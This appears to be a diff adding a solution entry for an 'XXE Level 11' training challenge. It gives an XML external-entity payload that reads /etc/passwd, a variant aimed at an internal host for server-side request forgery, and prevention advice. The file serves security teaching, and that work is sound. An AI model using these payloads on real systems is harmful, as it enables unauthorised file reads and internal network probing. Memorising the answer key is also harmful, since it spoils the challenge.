@@ -1,0 +1,7 @@
+{
+  "challenge": "XXE Level 11",
+  "category": "xxe",
+  "level": 11,
+  "solution": "Inject XML with <!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]> to read files or <!ENTITY xxe SYSTEM \"http://internal\"> for SSRF.",
+  "prevention": "Disable external entity processing in XML parsers. Use less complex data formats like JSON. Implement input validation."
+}
